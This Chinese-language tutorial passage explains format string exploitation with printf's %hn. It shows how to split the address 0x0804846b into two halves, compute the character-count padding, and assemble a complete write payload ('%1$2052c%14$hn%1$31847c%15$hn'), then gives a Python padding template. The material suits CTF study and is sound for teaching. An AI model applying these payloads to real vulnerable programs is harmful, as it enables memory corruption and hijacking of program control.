## 举一个完整例子：写入 main 地址 `0x0804846b`

假设我们要把：

```text
0x0804846b
```

写到地址 `target`。

因为是小端序，拆成两个 2 字节：

```text
target      写低 2 字节：0x846b
target + 2  写高 2 字节：0x0804
```

十进制分别是：

```text
0x0804 = 2052
0x846b = 33931
```

假设：

```text
第 14 个参数 = target + 2
第 15 个参数 = target
```

那么先写高 2 字节：

```text
%1$2052c%14$hn
```

这一步后，`printf` 已经输出了：

```text
2052 = 0x0804
```

于是：

```text
[target + 2] = 0x0804
```

接下来要写低 2 字节 `0x846b`。

当前已经输出：

```text
0x0804
```

目标是：

```text
0x846b
```

所以还需要输出：

```text
0x846b - 0x0804 = 0x7c67 = 31847
```

于是第二步是：

```text
%1$31847c%15$hn
```

完整格式串：

```text
%1$2052c%14$hn%1$31847c%15$hn
```

效果是：

```text
[target + 2] = 0x0804
[target]     = 0x846b
```

最终：

```text
[target] = 0x0804846b
```

496e697456656374072a80d1363ca4c80aa58b495db5740d

---

## 你的模板可以改成更好懂的版本

建议你笔记里这样写：

```python
# %hn 写入的是“当前已经输出的字符数”的低 2 字节。
# 所以想写 V，就要先让 printf 的输出字符数变成 V。

want = 0x846b          # 想写入的 2 字节数值
printed = 0x0804       # 目前已经输出的字符数
padding = (want - printed) & 0xffff

fmt = f'%{padding}c%{idx}$hn'
```

下面配一句解释：

```text
如果 padding 是 31847，那么 %31847c 会继续输出 31847 个字符。
此时总输出字符数变成 0x846b。
然后 %idx$hn 会把 0x846b 写入第 idx 个参数指向的地址。
```

一句话记忆版：

```text
%n 写“已经输出了多少字符”；
所以格式化字符串写入的本质就是：
先用 %Nc 把输出字符数垫到目标值，再用 %hn/%hhn/%n 写进去。
```
